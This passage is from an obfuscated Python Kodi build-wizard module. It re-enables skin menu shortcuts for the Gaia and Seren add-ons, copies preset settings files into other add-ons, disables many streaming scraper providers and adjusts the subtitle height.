      OOOOOOOOOOO0O0OOO =O0OO0O0O0O0OOOOO0 .read ()#line:1216
    OOOOOOOOOOO0O0OOO =OOOOOOOOOOO0O0OOO .replace ('''	<shortcut>
		<defaultID />
		<label>סרטים - Gaia</label>
		<label2>פריטים מותאמים אישית</label2>
		<icon>DefaultShortcut.png</icon>
		<thumb>special://home/Graphics/addons/gaia.jpg</thumb>
		<action>ActivateWindow(Videos,"plugin://plugin.video.gaia/?action=movies&amp;type=movie&amp;kids=0",return)</action>
		<disabled>True</disabled>
	</shortcut>''','''	<shortcut>
		<defaultID />
		<label>סרטים - Gaia</label>
		<label2>פריטים מותאמים אישית</label2>
		<icon>DefaultShortcut.png</icon>
		<thumb>special://home/Graphics/addons/gaia.jpg</thumb>
		<action>ActivateWindow(Videos,"plugin://plugin.video.gaia/?action=movies&amp;type=movie&amp;kids=0",return)</action>
	</shortcut>''')#line:1234
    with open (OOOO0OO0O0OOO00OO ,'w')as O0OO0O0O0O0OOOOO0 :#line:1237
      O0OO0O0O0O0OOOOO0 .write (OOOOOOOOOOO0O0OOO )#line:1238
    OOOO0OO0O0OOO00OO =os .path .join (xbmc .translatePath ("special://userdata"),"addon_data","script.skinshortcuts","b-srtym-b.DATA.xml")#line:1242
    with open (OOOO0OO0O0OOO00OO ,'r')as O0OO0O0O0O0OOOOO0 :#line:1243
      OOOOOOOOOOO0O0OOO =O0OO0O0O0O0OOOOO0 .read ()#line:1244
    OOOOOOOOOOO0O0OOO =OOOOOOOOOOO0O0OOO .replace ('''	<shortcut>
		<defaultID />
		<label>סרטים - Seren</label>
		<label2>פריטים מותאמים אישית</label2>
		<icon>DefaultShortcut.png</icon>
		<thumb>special://home/Graphics/addons/seren2.png</thumb>
		<action>ActivateWindow(Videos,"plugin://plugin.video.seren/?action=moviesHome",return)</action>
		<disabled>True</disabled>
	</shortcut>''','''	<shortcut>
		<defaultID />
		<label>סרטים - Seren</label>
		<label2>פריטים מותאמים אישית</label2>
		<icon>DefaultShortcut.png</icon>
		<thumb>special://home/Graphics/addons/seren2.png</thumb>
		<action>ActivateWindow(Videos,"plugin://plugin.video.seren/?action=moviesHome",return)</action>
	</shortcut>''')#line:1262
    with open (OOOO0OO0O0OOO00OO ,'w')as O0OO0O0O0O0OOOOO0 :#line:1265
      O0OO0O0O0O0OOOOO0 .write (OOOOOOOOOOO0O0OOO )#line:1266
    OOOO0OO0O0OOO00OO =os .path .join (xbmc .translatePath ("special://userdata"),"addon_data","script.skinshortcuts","b-srtym-b.DATA.xml")#line:1270
    with open (OOOO0OO0O0OOO00OO ,'r')as O0OO0O0O0O0OOOOO0 :#line:1271
      OOOOOOOOOOO0O0OOO =O0OO0O0O0O0OOOOO0 .read ()#line:1272
    OOOOOOOOOOO0O0OOO =OOOOOOOOOOO0O0OOO .replace ('''	<shortcut>
		<defaultID />
		<label>סרטים - Gaia</label>
		<label2>פריטים מותאמים אישית</label2>
		<icon>DefaultShortcut.png</icon>
		<thumb>special://home/Graphics/addons/gaia.jpg</thumb>
		<action>ActivateWindow(Videos,"plugin://plugin.video.gaia/?action=movies&amp;type=movie&amp;kids=0",return)</action>
		<disabled>True</disabled>
	</shortcut>''','''	<shortcut>
		<defaultID />
		<label>סרטים - Gaia</label>
		<label2>פריטים מותאמים אישית</label2>
		<icon>DefaultShortcut.png</icon>
		<thumb>special://home/Graphics/addons/gaia.jpg</thumb>
		<action>ActivateWindow(Videos,"plugin://plugin.video.gaia/?action=movies&amp;type=movie&amp;kids=0",return)</action>
	</shortcut>''')#line:1290
    with open (OOOO0OO0O0OOO00OO ,'w')as O0OO0O0O0O0OOOOO0 :#line:1293
      O0OO0O0O0O0OOOOO0 .write (OOOOOOOOOOO0O0OOO )#line:1294
    OOOO0OO0O0OOO00OO =os .path .join (xbmc .translatePath ("special://userdata"),"addon_data","script.skinshortcuts","x1102.DATA.xml")#line:1297
    with open (OOOO0OO0O0OOO00OO ,'r')as O0OO0O0O0O0OOOOO0 :#line:1298
      OOOOOOOOOOO0O0OOO =O0OO0O0O0O0OOOOO0 .read ()#line:1299
    OOOOOOOOOOO0O0OOO =OOOOOOOOOOO0O0OOO .replace ('''	<shortcut>
		<defaultID />
		<label>סדרות - Seren</label>
		<label2>פריטים מותאמים אישית</label2>
		<icon>DefaultShortcut.png</icon>
		<thumb>special://home/Graphics/addons/seren2.png</thumb>
		<action>ActivateWindow(Videos,"plugin://plugin.video.seren/?action=showsHome",return)</action>
		<disabled>True</disabled>
	</shortcut>''','''	<shortcut>
		<defaultID />
		<label>סדרות - Seren</label>
		<label2>פריטים מותאמים אישית</label2>
		<icon>DefaultShortcut.png</icon>
		<thumb>special://home/Graphics/addons/seren2.png</thumb>
		<action>ActivateWindow(Videos,"plugin://plugin.video.seren/?action=showsHome",return)</action>
	</shortcut>''')#line:1317
    with open (OOOO0OO0O0OOO00OO ,'w')as O0OO0O0O0O0OOOOO0 :#line:1320
      O0OO0O0O0O0OOOOO0 .write (OOOOOOOOOOO0O0OOO )#line:1321
    OOOO0OO0O0OOO00OO =os .path .join (xbmc .translatePath ("special://userdata"),"addon_data","script.skinshortcuts","x1102.DATA.xml")#line:1323
    with open (OOOO0OO0O0OOO00OO ,'r')as O0OO0O0O0O0OOOOO0 :#line:1324
      OOOOOOOOOOO0O0OOO =O0OO0O0O0O0OOOOO0 .read ()#line:1325
    OOOOOOOOOOO0O0OOO =OOOOOOOOOOO0O0OOO .replace ('''	<shortcut>
		<defaultID />
		<label>סדרות - Gaia</label>
		<label2>פריטים מותאמים אישית</label2>
		<icon>DefaultShortcut.png</icon>
		<thumb>special://home/Graphics/addons/gaia.jpg</thumb>
		<action>ActivateWindow(Videos,"plugin://plugin.video.gaia/?action=shows&amp;type=show&amp;kids=0",return)</action>
		<disabled>True</disabled>
	</shortcut>''','''	<shortcut>
		<defaultID />
		<label>סדרות - Gaia</label>
		<label2>פריטים מותאמים אישית</label2>
		<icon>DefaultShortcut.png</icon>
		<thumb>special://home/Graphics/addons/gaia.jpg</thumb>
		<action>ActivateWindow(Videos,"plugin://plugin.video.gaia/?action=shows&amp;type=show&amp;kids=0",return)</action>
	</shortcut>''')#line:1343
    with open (OOOO0OO0O0OOO00OO ,'w')as O0OO0O0O0O0OOOOO0 :#line:1346
      O0OO0O0O0O0OOOOO0 .write (OOOOOOOOOOO0O0OOO )#line:1347
    OOOO0OO0O0OOO00OO =os .path .join (xbmc .translatePath ("special://userdata"),"addon_data","script.skinshortcuts","b-sdrvt-b.DATA.xml")#line:1349
    with open (OOOO0OO0O0OOO00OO ,'r')as O0OO0O0O0O0OOOOO0 :#line:1350
      OOOOOOOOOOO0O0OOO =O0OO0O0O0O0OOOOO0 .read ()#line:1351
    OOOOOOOOOOO0O0OOO =OOOOOOOOOOO0O0OOO .replace ('''	<shortcut>
		<defaultID />
		<label>סדרות - Gaia</label>
		<label2>פריטים מותאמים אישית</label2>
		<icon>DefaultShortcut.png</icon>
		<thumb>special://home/Graphics/addons/gaia.jpg</thumb>
		<action>ActivateWindow(Videos,"plugin://plugin.video.gaia/?action=shows&amp;type=show&amp;kids=0",return)</action>
		<disabled>True</disabled>
	</shortcut>''','''	<shortcut>
		<defaultID />
		<label>סדרות - Gaia</label>
		<label2>פריטים מותאמים אישית</label2>
		<icon>DefaultShortcut.png</icon>
		<thumb>special://home/Graphics/addons/gaia.jpg</thumb>
		<action>ActivateWindow(Videos,"plugin://plugin.video.gaia/?action=shows&amp;type=show&amp;kids=0",return)</action>
	</shortcut>''')#line:1369
    with open (OOOO0OO0O0OOO00OO ,'w')as O0OO0O0O0O0OOOOO0 :#line:1372
      O0OO0O0O0O0OOOOO0 .write (OOOOOOOOOOO0O0OOO )#line:1373
    OOOO0OO0O0OOO00OO =os .path .join (xbmc .translatePath ("special://userdata"),"addon_data","script.skinshortcuts","b-sdrvt-b.DATA.xml")#line:1376
    with open (OOOO0OO0O0OOO00OO ,'r')as O0OO0O0O0O0OOOOO0 :#line:1377
      OOOOOOOOOOO0O0OOO =O0OO0O0O0O0OOOOO0 .read ()#line:1378
    OOOOOOOOOOO0O0OOO =OOOOOOOOOOO0O0OOO .replace ('''	<shortcut>
		<defaultID />
		<label>סדרות - Seren</label>
		<label2>פריטים מותאמים אישית</label2>
		<icon>DefaultShortcut.png</icon>
		<thumb>special://home/Graphics/addons/seren2.png</thumb>
		<action>ActivateWindow(Videos,"plugin://plugin.video.seren/?action=showsHome",return)</action>
		<disabled>True</disabled>
	</shortcut>''','''	<shortcut>
		<defaultID />
		<label>סדרות - Seren</label>
		<label2>פריטים מותאמים אישית</label2>
		<icon>DefaultShortcut.png</icon>
		<thumb>special://home/Graphics/addons/seren2.png</thumb>
		<action>ActivateWindow(Videos,"plugin://plugin.video.seren/?action=showsHome",return)</action>
	</shortcut>''')#line:1396
    with open (OOOO0OO0O0OOO00OO ,'w')as O0OO0O0O0O0OOOOO0 :#line:1399
      O0OO0O0O0O0OOOOO0 .write (OOOOOOOOOOO0O0OOO )#line:1400
def rdbuildinstallON ():#line:1403
    try :#line:1405
       O0000OOO00OOOO00O =ADDONPATH +"/resources/rd/victory.xml"#line:1406
       OOO0O000000O0OOO0 =xbmc .translatePath ('special://userdata/addon_data/plugin.video.allmoviesin')+"/settings.xml"#line:1407
       copyfile (O0000OOO00OOOO00O ,OOO0O000000O0OOO0 )#line:1409
       O0000OOO00OOOO00O =ADDONPATH +"/resources/rd/exodusredux.xml"#line:1411
       OOO0O000000O0OOO0 =xbmc .translatePath ('special://userdata/addon_data/plugin.video.exodusredux')+"/settings.xml"#line:1412
       copyfile (O0000OOO00OOOO00O ,OOO0O000000O0OOO0 )#line:1414
       O0000OOO00OOOO00O =ADDONPATH +"/resources/rd/openscrapers.xml"#line:1416
       OOO0O000000O0OOO0 =xbmc .translatePath ('special://userdata/addon_data/script.module.openscrapers')+"/settings.xml"#line:1417
       copyfile (O0000OOO00OOOO00O ,OOO0O000000O0OOO0 )#line:1419
       O0000OOO00OOOO00O =ADDONPATH +"/resources/rd/Splash.png"#line:1422
       OOO0O000000O0OOO0 =xbmc .translatePath ('special://home/media')+"/Splash.png"#line:1423
       copyfile (O0000OOO00OOOO00O ,OOO0O000000O0OOO0 )#line:1425
    except :#line:1427
       pass #line:1428
def rdbuild ():#line:1438
	O0O0000O0O0O00000 =(ADDON .getSetting ("auto_rd"))#line:1439
	if O0O0000O0O0O00000 =='true':#line:1440
		O00OO00O0O0O00OOO =xbmcaddon .Addon ('plugin.video.allmoviesin')#line:1441
		O00OO00O0O0O00OOO .setSetting ('all_t','0')#line:1442
		O00OO00O0O0O00OOO .setSetting ('rd_menu_enable','false')#line:1443
		O00OO00O0O0O00OOO .setSetting ('magnet_bay','false')#line:1444
		O00OO00O0O0O00OOO .setSetting ('magnet_extra','false')#line:1445
		O00OO00O0O0O00OOO .setSetting ('rd_only','false')#line:1446
		O00OO00O0O0O00OOO .setSetting ('ftp','false')#line:1448
		O00OO00O0O0O00OOO .setSetting ('fp','false')#line:1449
		O00OO00O0O0O00OOO .setSetting ('filter_fp','false')#line:1450
		O00OO00O0O0O00OOO .setSetting ('fp_size_en','false')#line:1451
		O00OO00O0O0O00OOO .setSetting ('afdah','false')#line:1452
		O00OO00O0O0O00OOO .setSetting ('ap2s','false')#line:1453
		O00OO00O0O0O00OOO .setSetting ('cin','false')#line:1454
		O00OO00O0O0O00OOO .setSetting ('clv','false')#line:1455
		O00OO00O0O0O00OOO .setSetting ('cmv','false')#line:1456
		O00OO00O0O0O00OOO .setSetting ('dl20','false')#line:1457
		O00OO00O0O0O00OOO .setSetting ('esc','false')#line:1458
		O00OO00O0O0O00OOO .setSetting ('extra','false')#line:1459
		O00OO00O0O0O00OOO .setSetting ('film','false')#line:1460
		O00OO00O0O0O00OOO .setSetting ('fre','false')#line:1461
		O00OO00O0O0O00OOO .setSetting ('fxy','false')#line:1462
		O00OO00O0O0O00OOO .setSetting ('genv','false')#line:1463
		O00OO00O0O0O00OOO .setSetting ('getgo','false')#line:1464
		O00OO00O0O0O00OOO .setSetting ('gold','false')#line:1465
		O00OO00O0O0O00OOO .setSetting ('gona','false')#line:1466
		O00OO00O0O0O00OOO .setSetting ('hdmm','false')#line:1467
		O00OO00O0O0O00OOO .setSetting ('hdt','false')#line:1468
		O00OO00O0O0O00OOO .setSetting ('icy','false')#line:1469
		O00OO00O0O0O00OOO .setSetting ('ind','false')#line:1470
		O00OO00O0O0O00OOO .setSetting ('iwi','false')#line:1471
		O00OO00O0O0O00OOO .setSetting ('jen_free','false')#line:1472
		O00OO00O0O0O00OOO .setSetting ('kiss','false')#line:1473
		O00OO00O0O0O00OOO .setSetting ('lavin','false')#line:1474
		O00OO00O0O0O00OOO .setSetting ('los','false')#line:1475
		O00OO00O0O0O00OOO .setSetting ('m4u','false')#line:1476
		O00OO00O0O0O00OOO .setSetting ('mesh','false')#line:1477
		O00OO00O0O0O00OOO .setSetting ('mf','false')#line:1478
		O00OO00O0O0O00OOO .setSetting ('mkvc','false')#line:1479
		O00OO00O0O0O00OOO .setSetting ('mjy','false')#line:1480
		O00OO00O0O0O00OOO .setSetting ('hdonline','false')#line:1481
		O00OO00O0O0O00OOO .setSetting ('moviex','false')#line:1482
		O00OO00O0O0O00OOO .setSetting ('mpr','false')#line:1483
		O00OO00O0O0O00OOO .setSetting ('mvg','false')#line:1484
		O00OO00O0O0O00OOO .setSetting ('mvl','false')#line:1485
		O00OO00O0O0O00OOO .setSetting ('mvs','false')#line:1486
		O00OO00O0O0O00OOO .setSetting ('myeg','false')#line:1487
		O00OO00O0O0O00OOO .setSetting ('ninja','false')#line:1488
		O00OO00O0O0O00OOO .setSetting ('odb','false')#line:1489
		O00OO00O0O0O00OOO .setSetting ('ophd','false')#line:1490
		O00OO00O0O0O00OOO .setSetting ('pks','false')#line:1491
		O00OO00O0O0O00OOO .setSetting ('prf','false')#line:1492
		O00OO00O0O0O00OOO .setSetting ('put18','false')#line:1493
		O00OO00O0O0O00OOO .setSetting ('req','false')#line:1494
		O00OO00O0O0O00OOO .setSetting ('rftv','false')#line:1495
		O00OO00O0O0O00OOO .setSetting ('rltv','false')#line:1496
		O00OO00O0O0O00OOO .setSetting ('sc','false')#line:1497
		O00OO00O0O0O00OOO .setSetting ('seehd','false')#line:1498
		O00OO00O0O0O00OOO .setSetting ('showbox','false')#line:1499
		O00OO00O0O0O00OOO .setSetting ('shuid','false')#line:1500
		O00OO00O0O0O00OOO .setSetting ('sil_gh','false')#line:1501
		O00OO00O0O0O00OOO .setSetting ('spv','false')#line:1502
		O00OO00O0O0O00OOO .setSetting ('subs','false')#line:1503
		O00OO00O0O0O00OOO .setSetting ('tvs','false')#line:1504
		O00OO00O0O0O00OOO .setSetting ('tw','false')#line:1505
		O00OO00O0O0O00OOO .setSetting ('upto','false')#line:1506
		O00OO00O0O0O00OOO .setSetting ('vel','false')#line:1507
		O00OO00O0O0O00OOO .setSetting ('vex','false')#line:1508
		O00OO00O0O0O00OOO .setSetting ('vidc','false')#line:1509
		O00OO00O0O0O00OOO .setSetting ('w4hd','false')#line:1510
		O00OO00O0O0O00OOO .setSetting ('wav','false')#line:1511
		O00OO00O0O0O00OOO .setSetting ('wf','false')#line:1512
		O00OO00O0O0O00OOO .setSetting ('wse','false')#line:1513
		O00OO00O0O0O00OOO .setSetting ('wss','false')#line:1514
		O00OO00O0O0O00OOO .setSetting ('wsse','false')#line:1515
		O00OO00O0O0O00OOO =xbmcaddon .Addon ('plugin.video.speedmax')#line:1516
		O00OO00O0O0O00OOO .setSetting ('debrid.only','true')#line:1517
		O00OO00O0O0O00OOO .setSetting ('hosts.captcha','false')#line:1518
		O00OO00O0O0O00OOO =xbmcaddon .Addon ('script.module.civitasscrapers')#line:1519
		O00OO00O0O0O00OOO .setSetting ('provider.123moviehd','false')#line:1520
		O00OO00O0O0O00OOO .setSetting ('provider.300mbdownload','false')#line:1521
		O00OO00O0O0O00OOO .setSetting ('provider.alltube','false')#line:1522
		O00OO00O0O0O00OOO .setSetting ('provider.allucde','false')#line:1523
		O00OO00O0O0O00OOO .setSetting ('provider.animebase','false')#line:1524
		O00OO00O0O0O00OOO .setSetting ('provider.animeloads','false')#line:1525
		O00OO00O0O0O00OOO .setSetting ('provider.animetoon','false')#line:1526
		O00OO00O0O0O00OOO .setSetting ('provider.bnwmovies','false')#line:1527
		O00OO00O0O0O00OOO .setSetting ('provider.boxfilm','false')#line:1528
		O00OO00O0O0O00OOO .setSetting ('provider.bs','false')#line:1529
		O00OO00O0O0O00OOO .setSetting ('provider.cartoonhd','false')#line:1530
		O00OO00O0O0O00OOO .setSetting ('provider.cdahd','false')#line:1531
		O00OO00O0O0O00OOO .setSetting ('provider.cdax','false')#line:1532
		O00OO00O0O0O00OOO .setSetting ('provider.cine','false')#line:1533
		O00OO00O0O0O00OOO .setSetting ('provider.cinenator','false')#line:1534
		O00OO00O0O0O00OOO .setSetting ('provider.cmovieshdbz','false')#line:1535
		O00OO00O0O0O00OOO .setSetting ('provider.coolmoviezone','false')#line:1536
		O00OO00O0O0O00OOO .setSetting ('provider.ddl','false')#line:1537
		O00OO00O0O0O00OOO .setSetting ('provider.deepmovie','false')#line:1538
		O00OO00O0O0O00OOO .setSetting ('provider.ekinomaniak','false')#line:1539
		O00OO00O0O0O00OOO .setSetting ('provider.ekinotv','false')#line:1540
		O00OO00O0O0O00OOO .setSetting ('provider.filiser','false')#line:1541
		O00OO00O0O0O00OOO .setSetting ('provider.filmpalast','false')#line:1542
		O00OO00O0O0O00OOO .setSetting ('provider.filmwebbooster','false')#line:1543
		O00OO00O0O0O00OOO .setSetting ('provider.filmxy','false')#line:1544
		O00OO00O0O0O00OOO .setSetting ('provider.fmovies','false')#line:1545
		O00OO00O0O0O00OOO .setSetting ('provider.foxx','false')#line:1546
		O00OO00O0O0O00OOO .setSetting ('provider.freefmovies','false')#line:1547
		O00OO00O0O0O00OOO .setSetting ('provider.freeputlocker','false')#line:1548
		O00OO00O0O0O00OOO .setSetting ('provider.furk','false')#line:1549
		O00OO00O0O0O00OOO .setSetting ('provider.gamatotv','false')#line:1550
		O00OO00O0O0O00OOO .setSetting ('provider.gogoanime','false')#line:1551
		O00OO00O0O0O00OOO .setSetting ('provider.gowatchseries','false')#line:1552
		O00OO00O0O0O00OOO .setSetting ('provider.hackimdb','false')#line:1553
		O00OO00O0O0O00OOO .setSetting ('provider.hdfilme','false')#line:1554
		O00OO00O0O0O00OOO .setSetting ('provider.hdmto','false')#line:1555
		O00OO00O0O0O00OOO .setSetting ('provider.hdpopcorns','false')#line:1556
		O00OO00O0O0O00OOO .setSetting ('provider.hdstreams','false')#line:1557
		O00OO00O0O0O00OOO .setSetting ('provider.horrorkino','false')#line:1559
		O00OO00O0O0O00OOO .setSetting ('provider.iitv','false')#line:1560
		O00OO00O0O0O00OOO .setSetting ('provider.iload','false')#line:1561
		O00OO00O0O0O00OOO .setSetting ('provider.iwaatch','false')#line:1562
		O00OO00O0O0O00OOO .setSetting ('provider.kinodogs','false')#line:1563
		O00OO00O0O0O00OOO .setSetting ('provider.kinoking','false')#line:1564
		O00OO00O0O0O00OOO .setSetting ('provider.kinow','false')#line:1565
		O00OO00O0O0O00OOO .setSetting ('provider.kinox','false')#line:1566
		O00OO00O0O0O00OOO .setSetting ('provider.lichtspielhaus','false')#line:1567
		O00OO00O0O0O00OOO .setSetting ('provider.liomenoi','false')#line:1568
		O00OO00O0O0O00OOO .setSetting ('provider.magnetdl','false')#line:1571
		O00OO00O0O0O00OOO .setSetting ('provider.megapelistv','false')#line:1572
		O00OO00O0O0O00OOO .setSetting ('provider.movie2k-ac','false')#line:1573
		O00OO00O0O0O00OOO .setSetting ('provider.movie2k-ag','false')#line:1574
		O00OO00O0O0O00OOO .setSetting ('provider.movie2z','false')#line:1575
		O00OO00O0O0O00OOO .setSetting ('provider.movie4k','false')#line:1576
		O00OO00O0O0O00OOO .setSetting ('provider.movie4kis','false')#line:1577
		O00OO00O0O0O00OOO .setSetting ('provider.movieneo','false')#line:1578
		O00OO00O0O0O00OOO .setSetting ('provider.moviesever','false')#line:1579
		O00OO00O0O0O00OOO .setSetting ('provider.movietown','false')#line:1580
		O00OO00O0O0O00OOO .setSetting ('provider.mvrls','false')#line:1582
		O00OO00O0O0O00OOO .setSetting ('provider.netzkino','false')#line:1583
		O00OO00O0O0O00OOO .setSetting ('provider.odb','false')#line:1584
		O00OO00O0O0O00OOO .setSetting ('provider.openkatalog','false')#line:1585
		O00OO00O0O0O00OOO .setSetting ('provider.ororo','false')#line:1586
		O00OO00O0O0O00OOO .setSetting ('provider.paczamy','false')#line:1587
		O00OO00O0O0O00OOO .setSetting ('provider.peliculasdk','false')#line:1588
		O00OO00O0O0O00OOO .setSetting ('provider.pelisplustv','false')#line:1589
		O00OO00O0O0O00OOO .setSetting ('provider.pepecine','false')#line:1590
		O00OO00O0O0O00OOO .setSetting ('provider.primewire','false')#line:1591
		O00OO00O0O0O00OOO .setSetting ('provider.projectfreetv','false')#line:1592
		O00OO00O0O0O00OOO .setSetting ('provider.proxer','false')#line:1593
		O00OO00O0O0O00OOO .setSetting ('provider.pureanime','false')#line:1594
		O00OO00O0O0O00OOO .setSetting ('provider.putlocker','false')#line:1595
		O00OO00O0O0O00OOO .setSetting ('provider.putlockerfree','false')#line:1596
		O00OO00O0O0O00OOO .setSetting ('provider.reddit','false')#line:1597
		O00OO00O0O0O00OOO .setSetting ('provider.cartoonwire','false')#line:1598
		O00OO00O0O0O00OOO .setSetting ('provider.seehd','false')#line:1599
		O00OO00O0O0O00OOO .setSetting ('provider.segos','false')#line:1600
		O00OO00O0O0O00OOO .setSetting ('provider.serienstream','false')#line:1601
		O00OO00O0O0O00OOO .setSetting ('provider.series9','false')#line:1602
		O00OO00O0O0O00OOO .setSetting ('provider.seriesever','false')#line:1603
		O00OO00O0O0O00OOO .setSetting ('provider.seriesonline','false')#line:1604
		O00OO00O0O0O00OOO .setSetting ('provider.seriespapaya','false')#line:1605
		O00OO00O0O0O00OOO .setSetting ('provider.sezonlukdizi','false')#line:1606
		O00OO00O0O0O00OOO .setSetting ('provider.solarmovie','false')#line:1607
		O00OO00O0O0O00OOO .setSetting ('provider.solarmoviez','false')#line:1608
		O00OO00O0O0O00OOO .setSetting ('provider.stream-to','false')#line:1609
		O00OO00O0O0O00OOO .setSetting ('provider.streamdream','false')#line:1610
		O00OO00O0O0O00OOO .setSetting ('provider.streamflix','false')#line:1611
		O00OO00O0O0O00OOO .setSetting ('provider.streamit','false')#line:1612
		O00OO00O0O0O00OOO .setSetting ('provider.swatchseries','false')#line:1613
		O00OO00O0O0O00OOO .setSetting ('provider.szukajkatv','false')#line:1614
		O00OO00O0O0O00OOO .setSetting ('provider.tainiesonline','false')#line:1615
		O00OO00O0O0O00OOO .setSetting ('provider.tainiomania','false')#line:1616
		O00OO00O0O0O00OOO .setSetting ('provider.tata','false')#line:1619
		O00OO00O0O0O00OOO .setSetting ('provider.trt','false')#line:1620
		O00OO00O0O0O00OOO .setSetting ('provider.tvbox','false')#line:1621
		O00OO00O0O0O00OOO .setSetting ('provider.ultrahd','false')#line:1622
		O00OO00O0O0O00OOO .setSetting ('provider.video4k','false')#line:1623
		O00OO00O0O0O00OOO .setSetting ('provider.vidics','false')#line:1624
		O00OO00O0O0O00OOO .setSetting ('provider.view4u','false')#line:1625
		O00OO00O0O0O00OOO .setSetting ('provider.watchseries','false')#line:1626
		O00OO00O0O0O00OOO .setSetting ('provider.xrysoi','false')#line:1627
		O00OO00O0O0O00OOO .setSetting ('provider.library','false')#line:1628
def fixfont ():#line:1631
	OOOOO0OOOOO000O00 =xbmc .executeJSONRPC ('{"jsonrpc":"2.0","method":"Settings.GetSettings","id":1}')#line:1632
	O00000OO0O00OO00O =json .loads (OOOOO0OOOOO000O00 );#line:1634
	OO0OO0OOO0OO0O000 =O00000OO0O00OO00O ["result"]["settings"]#line:1635
	O000O0OOO00OOOOOO =[O0OOOOO0OOO0O00OO for O0OOOOO0OOO0O00OO in OO0OO0OOO0OO0O000 if O0OOOOO0OOO0O00OO ["id"]=="audiooutput.audiodevice"][0 ]#line:1637
	OOO00O0O0OO0OOOOO =O000O0OOO00OOOOOO ["options"];#line:1638
	O000O00O00OO00O0O =O000O0OOO00OOOOOO ["value"];#line:1639
	OOOO00OO0O0OO00O0 =[OO0000OOOO00OOO0O for (OO0000OOOO00OOO0O ,OOO00O0OO0OO000OO )in enumerate (OOO00O0O0OO0OOOOO )if OOO00O0OO0OO000OO ["value"]==O000O00O00OO00O0O ][0 ];#line:1641
	OO00O0OO0O0O000OO =(OOOO00OO0O0OO00O0 +1 )%len (OOO00O0O0OO0OOOOO )#line:1643
	O0OO0OOOOOOOO0O0O =OOO00O0O0OO0OOOOO [OO00O0OO0O0O000OO ]["value"]#line:1645
	OO0OO0OOO0OOO00OO =OOO00O0O0OO0OOOOO [OO00O0OO0O0O000OO ]["label"]#line:1646
	O00OOOOOOOOOOOOOO =xbmc .executeJSONRPC ('{"jsonrpc":"2.0","method":"Settings.SetSettingValue","params":{"setting":"subtitles.height","value":40},"id":1}')#line:1648
	try :#line:1650
		OO0000OO000000OOO =json .loads (O00OOOOOOOOOOOOOO );#line:1651
		if OO0000OO000000OOO ["result"]!=True :#line:1653
			raise Exception #line:1654
	except :#line:1655
		sys .stderr .write ("Error switching audio output device")#line:1656
		raise Exception #line:1657
def parseDOM2 (O00O00OOOOOO0OO0O ,name =u"",attrs ={},ret =False ):#line:1658
	if isinstance (O00O00OOOOOO0OO0O ,str ):#line:1661
		try :#line:1662
			O00O00OOOOOO0OO0O =[O00O00OOOOOO0OO0O .decode ("utf-8")]#line:1663
		except :#line:1664
			O00O00OOOOOO0OO0O =[O00O00OOOOOO0OO0O ]#line:1665
	elif isinstance (O00O00OOOOOO0OO0O ,unicode ):#line:1666
		O00O00OOOOOO0OO0O =[O00O00OOOOOO0OO0O ]#line:1667
	elif not isinstance (O00O00OOOOOO0OO0O ,list ):#line:1668
		return u""#line:1669
	if not name .strip ():#line:1671
		return u""#line:1672
	OOOO00OO00O000OO0 =[]#line:1674
	for OOO00000OOO00O0OO in O00O00OOOOOO0OO0O :#line:1675
		O0OOOO0000OOO000O =re .compile ('(<[^>]*?\n[^>]*?>)').findall (OOO00000OOO00O0OO )#line:1676
		for O0OOOOO0O00OO0OO0 in O0OOOO0000OOO000O :#line:1677
			OOO00000OOO00O0OO =OOO00000OOO00O0OO .replace (O0OOOOO0O00OO0OO0 ,O0OOOOO0O00OO0OO0 .replace ("\n"," "))#line:1678
		OO0OO000OOOO000O0 =[]#line:1680
		for O0OO0OO0OO00O0OOO in attrs :#line:1681
			OOO0OO0OOOO00O0OO =re .compile ('(<'+name +'[^>]*?(?:'+O0OO0OO0OO00O0OOO +'=[\'"]'+attrs [O0OO0OO0OO00O0OOO ]+'[\'"].*?>))',re .M |re .S ).findall (OOO00000OOO00O0OO )#line:1682
			if len (OOO0OO0OOOO00O0OO )==0 and attrs [O0OO0OO0OO00O0OOO ].find (" ")==-1 :#line:1683
				OOO0OO0OOOO00O0OO =re .compile ('(<'+name +'[^>]*?(?:'+O0OO0OO0OO00O0OOO +'='+attrs [O0OO0OO0OO00O0OOO ]+'.*?>))',re .M |re .S ).findall (OOO00000OOO00O0OO )#line:1684
			if len (OO0OO000OOOO000O0 )==0 :#line:1686
				OO0OO000OOOO000O0 =OOO0OO0OOOO00O0OO #line:1687
				OOO0OO0OOOO00O0OO =[]#line:1688
			else :#line:1689
				O0O0000OOO0OO0OOO =range (len (OO0OO000OOOO000O0 ))#line:1690
				O0O0000OOO0OO0OOO .reverse ()#line:1691
				for O00OOO0000O00000O in O0O0000OOO0OO0OOO :#line:1692
					if not OO0OO000OOOO000O0 [O00OOO0000O00000O ]in OOO0OO0OOOO00O0OO :#line:1693
						del (OO0OO000OOOO000O0 [O00OOO0000O00000O ])#line:1694
		if len (OO0OO000OOOO000O0 )==0 and attrs =={}:#line:1696
			OO0OO000OOOO000O0 =re .compile ('(<'+name +'>)',re .M |re .S ).findall (OOO00000OOO00O0OO )#line:1697
			if len (OO0OO000OOOO000O0 )==0 :#line:1698
				OO0OO000OOOO000O0 =re .compile ('(<'+name +' .*?>)',re .M |re .S ).findall (OOO00000OOO00O0OO )#line:1699
		if isinstance (ret ,str ):#line:1701
			OOO0OO0OOOO00O0OO =[]#line:1702
			for O0OOOOO0O00OO0OO0 in OO0OO000OOOO000O0 :#line:1703
				O00OOOO0000O0O00O =re .compile ('<'+name +'.*?'+ret +'=([\'"].[^>]*?[\'"])>',re .M |re .S ).findall (O0OOOOO0O00OO0OO0 )#line:1704
				if len (O00OOOO0000O0O00O )==0 :#line:1705
					O00OOOO0000O0O00O =re .compile ('<'+name +'.*?'+ret +'=(.[^>]*?)>',re .M |re .S ).findall (O0OOOOO0O00OO0OO0 )#line:1706
				for O00OO0O00O0OOO0OO in O00OOOO0000O0O00O :#line:1707
					OO00O00OOO0OO0OOO =O00OO0O00O0OOO0OO [0 ]#line:1708
					if OO00O00OOO0OO0OOO in "'\"":#line:1709
						if O00OO0O00O0OOO0OO .find ('='+OO00O00OOO0OO0OOO ,O00OO0O00O0OOO0OO .find (OO00O00OOO0OO0OOO ,1 ))>-1 :#line:1710
							O00OO0O00O0OOO0OO =O00OO0O00O0OOO0OO [:O00OO0O00O0OOO0OO .find ('='+OO00O00OOO0OO0OOO ,O00OO0O00O0OOO0OO .find (OO00O00OOO0OO0OOO ,1 ))]#line:1711
						if O00OO0O00O0OOO0OO .rfind (OO00O00OOO0OO0OOO ,1 )>-1 :#line:1713
